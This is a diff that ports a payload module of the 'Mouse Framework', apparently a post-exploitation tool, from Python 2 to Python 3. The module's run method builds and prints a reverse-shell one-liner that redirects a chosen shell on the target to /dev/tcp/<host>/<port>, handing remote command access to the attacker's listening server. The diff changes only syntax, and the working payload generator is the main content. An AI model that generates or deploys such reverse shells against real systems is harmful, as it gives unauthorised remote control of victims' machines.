@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -18,7 +18,7 @@
 #        You should have received a copy of the GNU General Public License
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-from core import helper as h
+import core.helper as h
 class payload:
 	def __init__(self):
 		self.name = "Target shell payload"
@@ -26,9 +26,9 @@ class payload:
 		self.usage = "Run in terminal."
 
 	def run(self,server):
-		shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
+		shell = input(h.info_general_raw("Target shell: ")).strip(" ")
 		payload = shell+" &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
 		backend = len(payload)
-		print h.WHITE + "-"*backend + h.ENDC
-		print h.COLOR_INFO+payload+h.ENDC
-		print h.WHITE + "-"*backend + h.ENDC
+		print(h.WHITE + "-"*backend + h.ENDC)
+		print(h.COLOR_INFO+payload+h.ENDC)
+		print(h.WHITE + "-"*backend + h.ENDC)
